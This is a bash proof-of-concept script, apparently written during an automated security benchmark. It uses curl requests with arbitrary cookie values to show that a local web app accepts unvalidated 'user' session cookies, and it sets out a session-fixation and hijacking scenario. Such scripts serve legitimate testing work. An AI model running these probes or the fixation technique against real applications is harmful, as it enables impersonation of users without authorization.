#!/bin/bash
# POC: Demonstrates session fixation vulnerability by setting arbitrary user cookies and verifying the application accepts them without validation
# Target: ./repo
# Created: 2025-12-02T16:18:57.860Z
# Session: benchmark-XBEN-075-24-miorxjbp

# Session Fixation POC - Demonstrates that the application accepts arbitrary user cookies
# without validation and uses them to maintain session state

TARGET_URL="${1:-http://localhost:5000}"
CUSTOM_COOKIE="0123456789abcdef0123456789abcdef"

echo "=========================================="
echo "Session Fixation Vulnerability POC"
echo "=========================================="
echo ""

# Step 1: Get initial response without custom cookie
echo "[*] Step 1: Baseline request without custom cookie"
BASELINE=$(curl -s "$TARGET_URL/list")
echo "[+] Response received: $(echo "$BASELINE" | grep -o 'Welcome!' || echo 'No Welcome message')"
echo ""

# Step 2: Request with arbitrary custom user cookie
echo "[*] Step 2: Request with arbitrary custom user cookie: $CUSTOM_COOKIE"
CUSTOM_RESPONSE=$(curl -s -b "user=$CUSTOM_COOKIE" "$TARGET_URL/list")

# Check if the custom cookie was accepted
if echo "$CUSTOM_RESPONSE" | grep -q "Welcome!"; then
    echo "[+] SUCCESS: Application accepted arbitrary cookie value!"
    echo "[+] Custom cookie '$CUSTOM_COOKIE' was accepted without validation"
    echo "[+] Application returned 'Welcome!' message with custom cookie"
    echo ""
else
    echo "[-] FAILED: Application did not accept custom cookie"
    echo "$CUSTOM_RESPONSE"
    exit 1
fi

# Step 3: Verify the custom cookie is maintained across requests
echo "[*] Step 3: Verify custom cookie persists across multiple requests"
FOLLOW_UP=$(curl -s -b "user=$CUSTOM_COOKIE" "$TARGET_URL/list")

if echo "$FOLLOW_UP" | grep -q "Welcome!"; then
    echo "[+] SUCCESS: Custom session cookie is maintained across requests"
    echo "[+] Session fixation successful - attacker can control session ID"
    echo ""
else
    echo "[-] FAILED: Custom cookie not maintained"
    exit 1
fi

# Step 4: Test with various arbitrary cookie values to demonstrate lack of validation
echo "[*] Step 4: Testing multiple arbitrary cookie values (no format validation)"
declare -a TEST_COOKIES=(
    "attacker_session_id"
    "12345"
    "AAAAAAAAAAAAAAAAAA"
    "!@#$%^&*()"
    ""
)

SUCCESS_COUNT=0
for test_cookie in "${TEST_COOKIES[@]}"; do
    RESPONSE=$(curl -s -b "user=$test_cookie" "$TARGET_URL/list" 2>/dev/null)
    if echo "$RESPONSE" | grep -q "Welcome!"; then
        SUCCESS_COUNT=$((SUCCESS_COUNT + 1))
        echo "[+] Accepted arbitrary cookie: '$test_cookie'"
    fi
done

echo ""
echo "[+] Successfully accepted $SUCCESS_COUNT out of ${#TEST_COOKIES[@]} arbitrary cookie values"
echo "[+] Application has NO cookie format validation"
echo ""

# Step 5: Demonstrate session hijacking scenario
echo "[*] Step 5: Session Hijacking Scenario"
echo "[+] An attacker can:"
echo "    1. Set a custom user cookie to a known value (e.g., $CUSTOM_COOKIE)"
echo "    2. Trick victim into using that cookie (via link, XSS, etc.)"
echo "    3. Once victim accepts the fixated session, attacker can impersonate them"
echo "    4. Both attacker and victim share the same session ID"
echo ""

# Step 6: Check if HttpOnly flag is set (from related finding)
echo "[*] Step 6: Checking Set-Cookie headers"
HEADERS=$(curl -s -i "$TARGET_URL/list" 2>&1 | grep -i "Set-Cookie")
if [ -z "$HEADERS" ]; then
    echo "[-] No Set-Cookie headers in response (cookie set via JavaScript)"
else
    echo "[*] Set-Cookie headers found:"
    echo "$HEADERS"
    if echo "$HEADERS" | grep -i "HttpOnly"; then
        echo "[-] HttpOnly flag is set"
    else
        echo "[+] HttpOnly flag is MISSING - cookies accessible via XSS"
    fi
fi

echo ""
echo "=========================================="
echo "POC CONCLUSION: Session Fixation CONFIRMED"
echo "=========================================="
echo "[+] The application accepts arbitrary user cookies without validation"
echo "[+] No session ID format validation is implemented"
echo "[+] No server-side session store validation occurs"
echo "[+] Attackers can fixate session IDs and hijack user sessions"
echo ""